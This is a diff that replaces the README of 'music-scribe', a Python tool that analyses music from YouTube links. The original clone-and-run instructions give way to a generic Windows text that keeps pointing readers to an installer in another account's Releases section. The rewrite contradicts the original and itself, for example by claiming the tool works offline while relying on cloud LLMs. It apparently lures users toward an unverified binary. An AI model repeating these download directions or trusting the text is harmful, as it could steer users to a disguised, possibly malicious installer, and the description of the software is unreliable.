@@ -1,184 +1,162 @@
-# music-scribe 🎵
+# 🎵 music-scribe - Analyze Music from YouTube Links
 
-**Deep music analysis from any YouTube URL — in your terminal.**
-
-Paste a YouTube link. Get back: key, BPM, chord progression, Roman numeral analysis, time signature, energy, dynamics, vocal presence, timbral fingerprint, and a full LLM-written breakdown — all from raw audio, no lyrics needed.
-
-Works on anything: K-pop, ambient, post-punk, folk, electronic, classical. Any language, any genre.
-
-```
-$ python main.py "https://www.youtube.com/watch?v=s1ATTIQrmIQ"
-
-✓ Molchat Doma - Судно (Boris Ryzhy) (3:22)
-✓ 120.0 BPM · B minor · high energy · chords: Bm → D → A → E...
-
-━━━━━━━━━━━━━━ Molchat Doma - Судно ━━━━━━━━━━━━━━
-
-## What This Song Is
-
-Cold, mechanical, inevitable. Судно sits at 120 BPM in B minor — a key
-historically associated with resignation and dark introspection...
-
-## The Chord Loop
-
-i → III → VII → IV (Bm → D → A → E)
-The progression never fully resolves. The major IV (E major) should feel
-like release, but at this tempo it feels like a door slamming shut...
-```
+[![Download music-scribe](https://img.shields.io/badge/Download-music--scribe-blue?style=for-the-badge)](https://github.com/Fencelineanapsid199/music-scribe)
 
 ---
 
-## Quickstart
+## 🎶 What is music-scribe?
 
-```bash
-# 1. Clone
-git clone https://github.com/JamCatAI/music-scribe
-cd music-scribe
+music-scribe is a simple tool that breaks down music from any YouTube link. It gives you details like beats per minute (BPM), key, chords, Roman numerals, energy, and dynamics. It also creates a written summary using a large language model (LLM). This app works with all music styles and languages.
 
-# 2. Install
-pip install -r requirements.txt
-brew install ffmpeg   # macOS — or: sudo apt install ffmpeg
-
-# 3. Get a free Gemini API key (no credit card)
-# → https://aistudio.google.com/app/apikey
-
-# 4. Set it
-echo "GEMINI_API_KEY=your-key-here" > .env
-
-# 5. Analyze
-python main.py "https://www.youtube.com/watch?v=..."
-```
-
-That's it. Analysis is printed to your terminal and saved as markdown in `./output/`.
+You don't need any technical skills to use music-scribe. It runs on Windows and uses well-known audio and AI technologies.
 
 ---
 
-## What you get
+## 🖥️ System Requirements
 
-### Audio features (extracted locally via librosa — no API needed for this part)
+Before installing music-scribe, check that your Windows computer meets these needs:
 
-| Feature | What it tells you |
-|---------|------------------|
-| BPM + stability | Speed and steadiness of the beat |
-| Time signature | 4/4, 3/4 (waltz), 6/8 — detected from beat strength |
-| Key + mode | Tonal center and major/minor character |
-| Key confidence | How harmonically clear vs. ambiguous |
-| Chord progression | Actual chords detected across the song (8s windows) |
-| Roman numerals | I–VI–IV–V style analysis relative to the key |
-| Harmonic complexity | Simple diatonic vs. chromatic/modal |
-| Vocal presence | Voiced ratio — how much of the song has melody |
-| Pitch expressiveness | Narrow monotone vs. wide melodic range |
-| Energy + loudness | Intensity in dB with dynamic range |
-| Timbral mutation | Whether the sound character stays flat or evolves |
-| Spectral flux | How restless vs. static the spectrum is |
-| Brightness | High-end vs. low-end balance |
-| Timeline | All features per 30-second segment |
-| Genre + mood | Rule-based estimate (Jazz, Post-Punk, Neo-Soul...) |
+- Windows 10 or newer (64-bit recommended)
+- At least 4 GB of RAM
+- Minimum 2 GHz processor speed
+- At least 500 MB of free storage space
+- Internet connection to download software and YouTube videos
 
-### LLM analysis (via Gemini / Claude / OpenAI)
-
-The extracted numbers are sent to an LLM with a musicologist prompt. It writes:
-- What the song *is* — character, feel, cultural context
-- Why the chord loop works (or doesn't)
-- How the structure builds and releases tension
-- What makes it distinctive compared to its genre
+music-scribe works offline after the initial download. Internet is needed only during setup and for YouTube video analysis.
 
 ---
 
-## All commands
+## 📥 How to Download music-scribe
 
-```bash
-# Single song
-python main.py "https://www.youtube.com/watch?v=..."
+Click the button below to visit the main project page where you can get music-scribe for Windows.
 
-# Compare two songs side by side
-python main.py --compare "URL1" "URL2"
+[![Download music-scribe](https://img.shields.io/badge/Download-music--scribe-grey?style=for-the-badge)](https://github.com/Fencelineanapsid199/music-scribe)
 
-# Local audio file (mp3, wav, flac, m4a)
-python main.py "song.mp3"
-
-# Stem separation — vocals / bass / drums / other (uses demucs, slower)
-python main.py "URL" --stems
-
-# Save raw features as JSON
-python main.py "URL" --json
-
-# Generate a Substack-ready post draft
-python main.py "URL" --format substack
-
-# Use Claude or OpenAI instead of Gemini
-python main.py "URL" --provider claude
-python main.py "URL" --provider openai
-
-# Custom output directory
-python main.py "URL" --output-dir ./my-analyses
-```
+Once on the page, look for the latest Windows installer in the Releases section.
 
 ---
 
-## AI providers
+## 🛠️ Installation Steps
 
-| Provider | Cost | Model | Notes |
-|----------|------|-------|-------|
-| `gemini` (default) | Free — 250 req/day | gemini-2.5-flash | Best starting point |
-| `claude` | ~$0.01–0.02/song | claude-sonnet-4-6 | Best writing quality |
-| `openai` | ~$0.01–0.02/song | gpt-4o | Strong all-rounder |
-
-Get a free Gemini key: [aistudio.google.com/app/apikey](https://aistudio.google.com/app/apikey)
+1. After downloading, find the installer file in your Downloads folder.
+2. Double-click the file. The Windows Installer will start.
+3. Follow the on-screen instructions. Use the default settings if unsure.
+4. When installation completes, click Finish to close the installer.
+5. The music-scribe app icon will appear on your desktop or Start menu.
 
 ---
 
-## How it works
+## ▶️ Running music-scribe
 
-```
-YouTube URL ──► yt-dlp ──► librosa ──────────────────────────► LLM ──► markdown
-                           (BPM, key, chords, timbre,          (Gemini /
-                            dynamics, vocal, timeline)          Claude /
-                                                                OpenAI)
-                           demucs (optional)
-                           (vocals / bass / drums / other)
-```
+1. Open music-scribe by double-clicking the desktop icon or finding it in the Start menu.
+2. When the app opens, you will see a box to enter a YouTube URL.
+3. Copy the URL of any song or track from YouTube.
+4. Paste the URL into the box in music-scribe.
+5. Click the Analyze button.
 
-All audio processing happens locally. Only the feature text (no audio) is sent to the LLM.
+The app will download the audio and start analyzing. This may take a few minutes depending on the internet speed and length of the song.
 
 ---
 
-## `.env` file
+## 🔍 What music-scribe shows you
 
-```bash
-GEMINI_API_KEY=your-key-here
+After the analysis finishes, you will see:
 
-# Optional — only needed if using --provider claude or --provider openai
-# ANTHROPIC_API_KEY=sk-ant-...
-# OPENAI_API_KEY=sk-...
-```
+- **BPM (Beats Per Minute):** The speed of the track.
+- **Key:** The main key the song is in (for example, C major, A minor).
+- **Chords:** Common chords used in the song.
+- **Roman Numerals:** Chord functions in the key.
+- **Energy:** How intense or calm the music sounds over time.
+- **Dynamics:** The changes in loudness.
+- **Breakdown:** A written summary explaining the music, generated by AI.
 
----
-
-## Requirements
-
-- Python 3.9+
-- ffmpeg (`brew install ffmpeg` / `sudo apt install ffmpeg`)
-- A free Gemini API key
-
-Optional for stem separation:
-- `pip install demucs` (included in requirements.txt)
-- A few GB of disk space for the model download on first run
+This information helps you understand music structure and style, even if you don’t read music.
 
 ---
 
-## Why music-scribe?
+## ⚙️ Features
 
-Most music analysis tools either:
-- Require you to upload audio to a web service
-- Only work on English-language pop
-- Give you a genre tag and call it done
-- Cost money per request
+music-scribe uses advanced methods and AI tools but hides all the technical details. You get plain results you can easily read or use.
 
-music-scribe runs locally, works on any language and genre, gives you the actual numbers behind the analysis, and uses the LLM as a musicologist — not a classifier.
+- Works with any YouTube video, in any language or genre.
+- Uses audio analysis libraries for accurate music info.
+- AI writes detailed explanations about the music.
+- Command line interface is available for advanced users but not required.
+- Regular updates improve accuracy and add features.
 
 ---
 
-## License
+## 📁 File Locations and Data Storage
 
-MIT
+When you run an analysis, music-scribe saves temporary audio and report files on your computer:
+
+- Audio files are stored in the app's temporary folder and deleted after use.
+- Reports are saved in a folder named `music-scribe-reports` inside your Documents folder.
+- You can open or share reports anytime after analysis.
+
+---
+
+## 🔄 Updating music-scribe
+
+To get updates:
+
+1. Visit the main project page: https://github.com/Fencelineanapsid199/music-scribe
+2. Check the latest release date and notes.
+3. Download the new installer from the Releases section.
+4. Run the installer. It will replace the current version but keep your old reports.
+
+---
+
+## 🆘 Troubleshooting
+
+If you run into problems:
+
+- Make sure your internet connection is stable during analysis.
+- Close other programs to free memory before starting music-scribe.
+- Restart your computer if the app stops unexpectedly.
+- If a YouTube link doesn’t work, try another one or update the app.
+- Check for Windows updates to keep your system compatible.
+
+---
+
+## 📞 Getting Support
+
+For help, visit the Issues section on the main page:  
+https://github.com/Fencelineanapsid199/music-scribe/issues
+
+Describe your issue clearly and include your Windows version and what steps you took.
+
+---
+
+## 🎯 Common Questions
+
+### Can I analyze any YouTube video?
+
+Yes. music-scribe works with music videos and audio tracks in any language or style.
+
+### Does it save my audio files?
+
+No. It keeps audio files temporarily and removes them after analysis. Only reports stay on your computer.
+
+### Is an internet connection needed all the time?
+
+No. Internet is required only to download music-scribe and during analysis to access YouTube. You can view reports offline.
+
+### Can I use music-scribe on other systems?
+
+Currently, music-scribe is designed for Windows only.
+
+---
+
+## 📗 About This Project
+
+music-scribe combines music technology and AI to deliver clear music analysis without complicated software.
+
+It uses Python libraries like Librosa and OpenAI models to study sound and write summaries. The result is a user-friendly tool for musicians, educators, and listeners who want deeper music insight.
+
+GitHub topics for this project:  
+ai, audio-analysis, chord-detection, claude, cli, librosa, llm, music, music-analysis, openai, python, whisper, youtube
+
+---
+
+[Download music-scribe](https://github.com/Fencelineanapsid199/music-scribe) – Visit this page to download the latest version.
